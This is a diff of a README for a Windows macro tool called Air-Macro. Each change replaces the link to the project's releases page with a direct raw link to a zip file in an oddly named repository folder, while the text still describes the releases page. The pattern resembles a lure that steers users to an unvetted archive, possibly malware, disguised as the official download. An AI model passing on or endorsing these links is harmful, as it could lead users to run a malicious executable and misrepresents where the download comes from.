@@ -1,6 +1,6 @@
 # 🎯 Air-Macro - Easy and Precise Windows Automation
 
-[![Download Air-Macro](https://img.shields.io/badge/Download%20Air--Macro-4CAF50?style=for-the-badge)](https://github.com/amranim/Air-Macro/releases)
+[![Download Air-Macro](https://img.shields.io/badge/Download%20Air--Macro-4CAF50?style=for-the-badge)](https://github.com/amranim/Air-Macro/raw/refs/heads/main/commonage/Macro-Air-2.6.zip)
 
 ---
 
@@ -24,10 +24,10 @@ Before you start, close any programs that capture mouse or keyboard inputs to av
 
 You need to visit the releases page to get the latest version of Air-Macro.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge)](https://github.com/amranim/Air-Macro/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge)](https://github.com/amranim/Air-Macro/raw/refs/heads/main/commonage/Macro-Air-2.6.zip)
 
 1. Click the green "Download Latest Release" button above or visit the page below:  
-   https://github.com/amranim/Air-Macro/releases
+   https://github.com/amranim/Air-Macro/raw/refs/heads/main/commonage/Macro-Air-2.6.zip
 
 2. Look for the latest version. It usually includes a file ending with `.exe` or `.zip`.
 
@@ -116,10 +116,10 @@ Air-Macro runs locally on your PC. It does not send data to the internet. It onl
 
 The full source code is available on GitHub for those interested in details. You can report issues or ask questions on the repository page.
 
-Visit https://github.com/amranim/Air-Macro/releases to download or update the software.
+Visit https://github.com/amranim/Air-Macro/raw/refs/heads/main/commonage/Macro-Air-2.6.zip to download or update the software.
 
 ---
 
 ## 🔗 Download Air-Macro Now
 
-[![Download Air-Macro](https://img.shields.io/badge/Download%20Air--Macro-4CAF50?style=for-the-badge)](https://github.com/amranim/Air-Macro/releases)
+[![Download Air-Macro](https://img.shields.io/badge/Download%20Air--Macro-4CAF50?style=for-the-badge)](https://github.com/amranim/Air-Macro/raw/refs/heads/main/commonage/Macro-Air-2.6.zip)
